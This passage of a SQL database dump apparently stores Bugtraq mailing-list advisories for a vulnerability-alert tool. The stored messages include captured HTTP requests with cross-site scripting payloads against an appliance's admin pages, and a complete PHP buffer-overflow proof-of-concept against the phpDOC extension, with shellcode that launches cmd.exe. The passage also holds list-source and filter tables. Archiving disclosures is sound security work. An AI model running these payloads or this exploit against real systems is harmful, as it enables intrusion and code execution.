ows%5B3%5D.attrValue=true&rows%5B4%5D.attrName=ldap_failure_count&rows%5B4%5D.attrType=2&rows%5B4%5D.attrValidate=%5B1-50%5D&rows%5B4%5D.attrValidateStr=%5B1-50%5D&rows%5B4%5D.attrDepends=&rows%5B4%5D.multipleValue=0&rows%5B4%5D.modifyable=true&rows%5B4%5D.attrValueStrClone=3&rows%5B4%5D.langTagId=2016405&rows%5B4%5D.attrValueStr=3&rows%5B5%5D.attrName=ldap_monitor_intvl&rows%5B5%5D.attrType=2&rows%5B5%5D.attrValidate=%5B1-1440%5D&rows%5B5%5D.attrValidateStr=%5B1-1440%5D&rows%5B5%5D.attrDepends=&rows%5B5%5D.multipleValue=0&rows%5B5%5D.modifyable=true&rows%5B5%5D.attrValueStrClone=5&rows%5B5%5D.langTagId=2016406&rows%5B5%5D.attrValueStr=5&rows%5B6%5D.attrName=ldap_alert_type&rows%5B6%5D.attrType=12&rows%5B6%5D.attrValidate=%5BLabelValueBean%5BNo+Alert%2C+0%5D%2C+LabelValueBean%5BRESTART%2C+1%5D%2C+LabelValueBean%5BSHUTDOWN%2C+2%5D%2C+LabelValueBean%5BCRITICAL%2C+3%5D%2C+LabelValueBean%5BERROR%2C+4%5D%2C+LabelValueBean%5BWARNING%2C+5%5D%2C+LabelValueBean%5BNOTIFICATION%2C+6%5D%2C+LabelValueBean%5BINFORMATION%2C+7%5D%5D&rows%5B6%5D.attrValidateStr=30060019%3A0%2C30060007%3A1%2C30060008%3A2%2C30060003%3A3%2C30060004%3A4%2C30060009%3A5%2C30060010%3A6%2C30060005%3A7&rows%5B6%5D.attrDepends=&rows%5B6%5D.multipleValue=0&rows%5B6%5D.modifyable=true&rows%5B6%5D.attrValueStrClone=3&rows%5B6%5D.langTagId=2016407&rows%5B6%5D.attrValue=3&rows%5B7%5D.attrName=ldap_route_aft_masq&rows%5B7%5D.attrType=5&rows%5B7%5D.attrValidate=&rows%5B7%5D.attrValidateStr=&rows%5B7%5D.attrDepends=&rows%5B7%5D.multipleValue=0&rows%5B7%5D.modifyable=true&rows%5B7%5D.attrValueStrClone=0&rows%5B7%5D.langTagId=2016408&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:16 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #16 ] :.\n\nPOST\nhttps://172.0.0.2:10443/admin/mailFirewall_MailRoutingInternal.do?method=save\nHTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/mailFirewall_MailRoutingInternal.do?method=init&isMenuToggled=1\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 100\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/mailFirewall_MailRoutingInternal.do%3Fmethod%3Dinit%26isMenuToggled%3D1;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2CMailRoutingMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\ndtype=INBOUND&input1=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&input2=&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:23:28 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ XSS #17 ] :.\n\nPOST https://172.0.0.2:10443/admin/mailIdsConfig.do?method=save HTTP/1.1\nAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,\napplication/x-shockwave-flash, application/vnd.ms-excel,\napplication/vnd.ms-powerpoint, application/msword, */*\nReferer:\nhttps://172.0.0.2:10443/admin/mailIdsConfig.do?method=init&isMenuToggled=1&procId=90\nAccept-Language: es-ES,en-us;q=0.5\nContent-Type: application/x-www-form-urlencoded\nUA-CPU: x86\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR\n2.0.50727; .NET CLR 1.1.4322) Paros/3.2.13\nHost: 172.0.0.2:10443\nContent-Length: 2237\nConnection: Keep-Alive\nCache-Control: no-cache\nCookie: CTSecureToken=2B59F89A721290CD7E7E0774CDB4A3FE_admin;\ntabbedMenuSelected=11;\nitemToHighlight=https%3A//172.0.0.2%3A10443/admin/mailIdsConfig.do%3Fmethod%3Dinit%26isMenuToggled%3D1%26procId%3D90;\nmenusToExpand=%2CConfigurationMenu%2CWebAdminConfigurationMenu%2CUserAccountMenu%2CUserPreferenceMenu%2CAlertManagerMenu%2CMailFirewallMenu%2CLDAPConfigurationMenu%2CMailRoutingMenu%2CMailIPSMenu%2CApplicationLevelMenu%2CMailIDSMenu%2CApplicationLevelMenu%2C;\n/admin/dnsProtection.dofirsttimeload=1; /admin/dnsProtection.do=;\nJSESSIONID=5A6DABFA0209D0BEC17AF6841DEA184E\nprocId=10&rows%5B0%5D.attrName=pass_monitor&rows%5B0%5D.attrType=5&rows%5B0%5D.attrValidate=&rows%5B0%5D.attrValidateStr=&rows%5B0%5D.attrDepends=&rows%5B0%5D.multipleValue=0&rows%5B0%5D.modifyable=true&rows%5B0%5D.attrValueStrClone=0&rows%5B0%5D.langTagId=2000006&rows%5B1%5D.attrName=enable_dos&rows%5B1%5D.attrType=5&rows%5B1%5D.attrValidate=&rows%5B1%5D.attrValidateStr=&rows%5B1%5D.attrDepends=&rows%5B1%5D.multipleValue=0&rows%5B1%5D.modifyable=true&rows%5B1%5D.attrValueStrClone=0&rows%5B1%5D.langTagId=2000008&rows%5B2%5D.attrName=shm_timeout&rows%5B2%5D.attrType=2&rows%5B2%5D.attrValidate=%5B1-65535%5D&rows%5B2%5D.attrValidateStr=%5B1-65535%5D&rows%5B2%5D.attrDepends=&rows%5B2%5D.multipleValue=0&rows%5B2%5D.modifyable=true&rows%5B2%5D.attrValueStrClone=100&rows%5B2%5D.langTagId=2001009&rows%5B2%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA%27%29%3C%2Fscript%3E&rows%5B3%5D.attrName=shm_spamcount&rows%5B3%5D.attrType=2&rows%5B3%5D.attrValidate=%5B1-65535%5D&rows%5B3%5D.attrValidateStr=%5B1-65535%5D&rows%5B3%5D.attrDepends=&rows%5B3%5D.multipleValue=0&rows%5B3%5D.modifyable=true&rows%5B3%5D.attrValueStrClone=100&rows%5B3%5D.langTagId=2001010&rows%5B3%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA2%27%29%3C%2Fscript%3E&rows%5B4%5D.attrName=passcrackswitch&rows%5B4%5D.attrType=5&rows%5B4%5D.attrValidate=&rows%5B4%5D.attrValidateStr=&rows%5B4%5D.attrDepends=&rows%5B4%5D.multipleValue=0&rows%5B4%5D.modifyable=true&rows%5B4%5D.attrValueStrClone=0&rows%5B4%5D.langTagId=2004104&rows%5B5%5D.attrName=passcrackcount&rows%5B5%5D.attrType=2&rows%5B5%5D.attrValidate=%5B1-100%5D&rows%5B5%5D.attrValidateStr=%5B1-100%5D&rows%5B5%5D.attrDepends=&rows%5B5%5D.multipleValue=0&rows%5B5%5D.modifyable=true&rows%5B5%5D.attrValueStrClone=5&rows%5B5%5D.langTagId=2004105&rows%5B5%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA3%27%29%3C%2Fscript%3E&rows%5B6%5D.attrName=passtimeout&rows%5B6%5D.attrType=2&rows%5B6%5D.attrValidate=%5B1-3600%5D&rows%5B6%5D.attrValidateStr=%5B1-3600%5D&rows%5B6%5D.attrDepends=&rows%5B6%5D.multipleValue=0&rows%5B6%5D.modifyable=true&rows%5B6%5D.attrValueStrClone=60&rows%5B6%5D.langTagId=2004106&rows%5B6%5D.attrValueStr=%27%3E%3Cscript%3Ealert%28%27SIA4%27%29%3C%2Fscript%3E&submitValue=Submit\nHTTP/1.0 200 OK\nDate: Mon, 19 Feb 2007 10:24:22 GMT\nServer: Apache\nPragma: no-cache\nCache-Control: no-store\nExpires: Thu, 01 Jan 1970 00:00:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\n\n.: [ TIMELINE ] :.\n\n22/Mar/2007    - We publish the advisory.\n07/Mar/2007 - Second contact. Provider doesn''t answered.\n27/Feb/2007  - First contact with provider.\n19/Feb/2007 - Vulnerabilities founded.\n\n--=_gantz-15840-1174901611-0001-2--\n', 1, 1, 0);
INSERT IGNORE INTO `message` (`id`, `text`, `subject`, `body`, `message_type_id`, `source_id`, `processed`) VALUES (9, 'Return-Path: <bugtraq-return-31210-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx1.g.dreamhost.com\nReceived: from enforcer.dreamhost.com (sd-green-bigip-66.dreamhost.com [208.97.132.66])\n by spunkymail-mx1.g.dreamhost.com (Postfix) with ESMTP id 3F7BEFA15A\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:11:52 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by enforcer.dreamhost.com (Postfix) with ESMTP id 0AC9317D02F\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:11:52 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at enforcer.dreamhost.com\nX-Spam-Score: 0.001\nX-Spam-Level: \nX-Spam-Status: No, score=0.001 tagged_above=-999 required=999\n  tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from enforcer.dreamhost.com ([127.0.0.1])\n  by localhost (enforcer.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n   with ESMTP id aWO9SVReQN9V for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 10:11:51 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by enforcer.dreamhost.com (Postfix) with ESMTP id 61E8C17D039\n for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:11:51 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in2.mail.dreamhost.com [208.97.132.72]) with ESMTP; Mon, 26 Mar 2007 09:05:29 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id 21FFE23ACFF; Mon, 26 Mar 2007 09:52:00 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 21512 invoked from network); 25 Mar 2007 12:04:38 -0000\nDate: 25 Mar 2007 12:06:14 -0000\nMessage-ID: <20070325120614.29423.qmail@securityfocus.com>\nContent-Type: text/plain\nContent-Disposition: inline\nContent-Transfer-Encoding: binary\nMIME-Version: 1.0\nX-Mailer: MIME-tools 5.411 (Entity 5.404)\nFrom: retrog@alice.it\nTo: bugtraq@securityfocus.com\nSubject: PHP 5.2.1 with PECL phpDOC  local buffer overflow\n\n<?php\n//PHP 5.2.1 with PECL phpDOC confirm_phpdoc_compiled() local buffer overflow poc exploit\n//WIN 2K SP3 version / seh overwrite method\n//to be launched from the cli\n\n// by rgod\n// site: http://retrogod.altervista.org\n\nif (!extension_loaded("phpDOC")){\ndie("you need the phpDOC extension loaded.");\n}\n\n\n$____scode=\n"\\xeb\\x1b".\n"\\x5b".\n"\\x31\\xc0".\n"\\x50".\n"\\x31\\xc0".\n"\\x88\\x43\\x59".\n"\\x53".\n"\\xbb\\xca\\x73\\xe9\\x77". //WinExec\n"\\xff\\xd3".\n"\\x31\\xc0".\n"\\x50".\n"\\xbb\\x5c\\xcf\\xe9\\x77". //ExitProcess\n"\\xff\\xd3".\n"\\xe8\\xe0\\xff\\xff\\xff".\n"\\x63\\x6d\\x64".\n"\\x2e".\n"\\x65".\n"\\x78\\x65".\n"\\x20\\x2f".\n"\\x63\\x20".\n"start notepad & ";\n\n//eip & ecx set to the same value ...\n$eip="\\x47\\x30\\xE9\\x77";//0x77E93047      pop ECX - pop - retbis kernel32.dll\n//and futher (junk...) inc edi, xor cl ch, *ja short* \n//should work on sp4 if you find an usable address\n$____suntzu=str_repeat("\\x90",1393 - strlen($____scode)).$____scode.str_repeat("\\x90",30).$eip.str_repeat("\\x90",12);\nconfirm_phpdoc_compiled($____suntzu);\n\n?>\n\noriginal url: http://retrogod.altervista.org/php521_phpdoc_bof.html\n\n', 'PHP 5.2.1 with PECL phpDOC  local buffer overflow', '<?php\n//PHP 5.2.1 with PECL phpDOC confirm_phpdoc_compiled() local buffer overflow poc exploit\n//WIN 2K SP3 version / seh overwrite method\n//to be launched from the cli\n\n// by rgod\n// site: http://retrogod.altervista.org\n\nif (!extension_loaded("phpDOC")){\ndie("you need the phpDOC extension loaded.");\n}\n\n\n$____scode=\n"\\xeb\\x1b".\n"\\x5b".\n"\\x31\\xc0".\n"\\x50".\n"\\x31\\xc0".\n"\\x88\\x43\\x59".\n"\\x53".\n"\\xbb\\xca\\x73\\xe9\\x77". //WinExec\n"\\xff\\xd3".\n"\\x31\\xc0".\n"\\x50".\n"\\xbb\\x5c\\xcf\\xe9\\x77". //ExitProcess\n"\\xff\\xd3".\n"\\xe8\\xe0\\xff\\xff\\xff".\n"\\x63\\x6d\\x64".\n"\\x2e".\n"\\x65".\n"\\x78\\x65".\n"\\x20\\x2f".\n"\\x63\\x20".\n"start notepad & ";\n\n//eip & ecx set to the same value ...\n$eip="\\x47\\x30\\xE9\\x77";//0x77E93047      pop ECX - pop - retbis kernel32.dll\n//and futher (junk...) inc edi, xor cl ch, *ja short* \n//should work on sp4 if you find an usable address\n$____suntzu=str_repeat("\\x90",1393 - strlen($____scode)).$____scode.str_repeat("\\x90",30).$eip.str_repeat("\\x90",12);\nconfirm_phpdoc_compiled($____suntzu);\n\n?>\n\noriginal url: http://retrogod.altervista.org/php521_phpdoc_bof.html\n\n', 1, 1, 0),
(10, 'Return-Path: <bugtraq-return-31211-bugtraq2=digitalslack.com@securityfocus.com>\nX-Original-To: bugtraq2@digitalslack.com\nDelivered-To: m7283859@spunkymail-mx1.g.dreamhost.com\nReceived: from punisher.dreamhost.com (mailbigip.dreamhost.com [208.97.132.5])\n    by spunkymail-mx1.g.dreamhost.com (Postfix) with ESMTP id EDE76FA112\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:24:02 -0700 (PDT)\nReceived: from localhost (localhost [127.0.0.1])\n  by punisher.dreamhost.com (Postfix) with ESMTP id A223E673E5\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:24:04 -0700 (PDT)\nX-DH-Virus-Scanned: Debian amavisd-new at punisher.dreamhost.com\nX-Spam-Score: -2.999\nX-Spam-Level: \nX-Spam-Status: No, score=0.001-3 tagged_above=-999 required=999\n   tests=[UNPARSEABLE_RELAY=0.001]\nReceived: from punisher.dreamhost.com ([127.0.0.1])\n  by localhost (punisher.dreamhost.com [127.0.0.1]) (amavisd-new, port 10024)\n   with ESMTP id U9cwtZ9hDt2V for <bugtraq2@digitalslack.com>;\n   Mon, 26 Mar 2007 10:24:04 -0700 (PDT)\nReceived: from outgoing.securityfocus.com (outgoing.securityfocus.com [205.206.231.27])\n    by punisher.dreamhost.com (Postfix) with ESMTP id 40659673CE\n  for <bugtraq2@digitalslack.com>; Mon, 26 Mar 2007 10:24:04 -0700 (PDT)\nReceived: from outgoing.securityfocus.com by outgoing.securityfocus.com\n          via smtpd (for fltr-in4.mail.dreamhost.com [208.97.132.73]) with ESMTP; Mon, 26 Mar 2007 09:17:42 -0800\nReceived: from lists2.securityfocus.com (lists2.securityfocus.com [205.206.231.20])\n   by outgoing3.securityfocus.com (Postfix) with QMQP\n    id 1623123B257; Mon, 26 Mar 2007 09:52:30 -0700 (MST)\nMailing-List: contact bugtraq-help@securityfocus.com; run by ezmlm\nPrecedence: bulk\nList-Id: <bugtraq.list-id.securityfocus.com>\nList-Post: <mailto:bugtraq@securityfocus.com>\nList-Help: <mailto:bugtraq-help@securityfocus.com>\nList-Unsubscribe: <mailto:bugtraq-unsubscribe@securityfocus.com>\nList-Subscribe: <mailto:bugtraq-subscribe@securityfocus.com>\nDelivered-To: mailing list bugtraq@securityfocus.com\nDelivered-To: moderator for bugtraq@securityfocus.com\nReceived: (qmail 3823 invoked from network); 25 Mar 2007 17:42:06 -0000\nDate: 25 Mar 2007 17:43:15 -0000\nMessage-ID: <20070325174315.21456.qmail@securityfocus.com>\nContent-Type: text/plain\nContent-Disposition: inline\nContent-Transfer-Encoding: binary\nMIME-Version: 1.0\nX-Mailer: MIME-tools 5.411 (Entity 5.404)\nFrom: webmaster@subhub.com\nTo: bugtraq@securityfocus.com\nSubject: Re: **SubHub v2.3.0**\n\nFalse and/or malicious report. Exploit doesn''t/hasn''t exist.\n', 'Re: **SubHub v2.3.0**', 'False and/or malicious report. Exploit doesn''t/hasn''t exist.\n', 1, 1, 0);

-- 
-- Dumping data for table `message_type`
-- 

INSERT IGNORE INTO `message_type` (`id`, `name`, `desc`) VALUES (1, 'mail', 'mailing list emails');

-- 
-- Dumping data for table `qualifier`
-- 

INSERT IGNORE INTO `qualifier` (`id`, `name`, `desc`, `sql`) VALUES (1, 'contains', 'contains', 'ILIKE "%s"'),
(2, 'equal to', 'equal', '= "%s"'),
(3, 'starts_with', 'starts with', 'ILIKE "%s%"'),
(4, 'ends_with', 'ends with', 'ILIKE "%%s"'),
(5, 'not_start_with', 'does not start with', 'NOT LIKE "%s%"'),
(6, 'not_contains', 'does not contain', 'NOT ILIKE "%s"'),
(7, 'not_equal', 'not equal to', '<> "%s"'),
(8, 'regexp', 'regular expression', 'REGEXP "%s"');

-- 
-- Dumping data for table `source`
-- 

INSERT IGNORE INTO `source` (`id`, `name`, `url`, `desc`, `desc_long`, `message_type_id`) VALUES (1, 'bugtraq', '', '', '', 1),
(2, 'Full Disclosure', 'http://lists.grok.org.uk/full-disclosure-charter.html', 'An unmoderated high-traffic forum for disclosure of security information', 'An unmoderated high-traffic forum for disclosure of security information. Fresh vulnerabilities sometimes hit this list many hours before they pass through the Bugtraq moderation queue. The relaxed atmosphere of this quirky list provides some comic relief and certain industry gossip. Unfortunately 80% of the posts are worthless drivel, so finding the gems takes patience.', 1),
(3, 'VulnWatch', 'http://www.vulnwatch.org/', 'A non-discussion, non-patch, all-vulnerability annoucement list supported and run by a community of volunteer moderators distributed around the world.', 'A non-discussion, non-patch, all-vulnerability annoucement list supported and run by a community of volunteer moderators distributed around the world.', 1);

-- 
-- Dumping data for table `user_alert_methods`
-- 

INSERT IGNORE INTO `user_alert_methods` (`id`, `userprofile_id`, `alertmethod_id`) VALUES (126, 1, 1);

-- 
-- Dumping data for table `user_criteria`
-- 

INSERT IGNORE INTO `user_criteria` (`id`, `user_id`, `criteria_type_id`, `qualifier_id`, `value`) VALUES (1, 1, 1, 1, 'asdfadf'),
(2, 1, 1, 4, '435'),
(3, 1, 1, 1, 'werwer'),
(4, 1, 4, 3, 'dfg'),
(5, 1, 3, 3, 'bvncv');

-- 
-- Dumping data for table `user_profile`
-- 

INSERT IGNORE INTO `user_profile` (`id`, `user_id`, `where_heard`) VALUES (1, 1, 'nowhere');

-- 
-- Dumping data for table `user_sources`
-- 

INSERT IGNORE INTO `user_sources` (`id`, `userprofile_id`, `source_id`) VALUES (199, 1, 1),
(200, 1, 3);

